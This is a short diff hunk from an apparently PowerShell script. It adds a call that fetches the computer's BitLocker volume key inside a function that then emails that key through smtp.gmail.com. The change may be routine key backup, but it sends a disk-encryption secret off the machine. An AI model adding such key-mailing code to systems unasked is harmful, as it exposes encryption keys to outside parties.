@@ -49,6 +49,8 @@ function sendEmailWithKey {
 
     createPath
     
+    getVolumeKey
+    
     # --- 1. Define Email Parameters ---
     $SMTPServer = "smtp.gmail.com"
     $Subject = "Bitlocker Key Information for " + $env:COMPUTERNAME
